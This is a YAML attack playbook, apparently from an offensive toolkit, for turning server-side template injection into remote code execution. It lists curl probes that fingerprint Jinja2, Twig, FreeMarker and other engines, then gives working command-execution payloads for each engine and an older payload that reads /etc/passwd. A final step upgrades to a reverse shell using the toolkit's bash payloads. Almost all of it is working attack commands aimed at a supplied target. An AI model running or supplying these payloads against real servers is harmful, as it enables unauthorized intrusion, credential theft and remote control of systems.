id: ssti-to-rce
name: "Web → Shell — Server-Side Template Injection (Jinja2 / Twig / FreeMarker)"
description: >
  Fingerprint the template engine, find a sandbox bypass, hit RCE. The
  classic 7×7 / ${{7*7}} test tells you which engine you're hitting, and
  the chosen-engine sandbox bypass gives you shell.
tags: [web, ssti, jinja, twig, freemarker, rce]
difficulty: medium

inputs:
  - name: target_url
    description: "URL where reflected user input passes through a template engine."
    required: true
  - name: parameter
    description: "Parameter name being templated."

steps:
  - id: fingerprint
    name: "Engine fingerprint (try all the syntaxes)"
    inline_command: |
      # Try each — note which returns 49 (= 7*7):
      curl '<url>?<p>={{7*7}}'         # Jinja2 / Twig / Liquid
      curl '<url>?<p>=${7*7}'          # FreeMarker / Velocity / SpEL
      curl '<url>?<p>=<%= 7*7 %>'      # ERB (Ruby)
      curl '<url>?<p>=#{7*7}'          # Smarty / Spring
      curl '<url>?<p>={{ self }}'      # Jinja2 (shows the env)
    inputs:
      url: "${target_url}"
      p: "${parameter}"
    notes: |
      The differentiator is the second-line probe:
        Jinja2 → `{{ config.items() }}` shows app config
        Twig   → `{{ _self.env }}` exposes the env
        FreeMarker → `${"freemarker.template.utility.Execute"?new()("id")}`

  - id: jinja2_rce
    name: "Jinja2 / Flask RCE (escape sandbox)"
    inline_command: "curl '<url>?<p>={{cycler.__init__.__globals__.os.popen(\"id\").read()}}'"
    inputs:
      url: "${target_url}"
      p: "${parameter}"
    notes: |
      Modern Jinja2 sandbox escape via cycler. Older payloads:
        {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
      The subclass index varies — enumerate with `__subclasses__()`.

  - id: twig_rce
    name: "Twig RCE"
    inline_command: "curl '<url>?<p>={{[\"id\"]|filter(\"system\")}}'"
    inputs:
      url: "${target_url}"
      p: "${parameter}"

  - id: freemarker_rce
    name: "FreeMarker RCE"
    inline_command: "curl '<url>?<p>=<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'"
    inputs:
      url: "${target_url}"
      p: "${parameter}"

  - id: rev_shell
    name: "Pop a reverse shell once RCE works"
    inline_command: "# Replace `id` with one of the rsg-* commands (bash -i revshell). URL-encode + escape quotes carefully."
    notes: |
      Pair with WannaHack's commands/payloads/ (rsg-reverseshell-bash-i,
      rsg-reverseshell-python-1, etc). For most engines, a simple base64
      of the bash payload avoids quoting nightmares.

references:
  - title: "PortSwigger — SSTI"
    url:   "https://portswigger.net/research/server-side-template-injection"
  - title: "HackTricks — SSTI"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
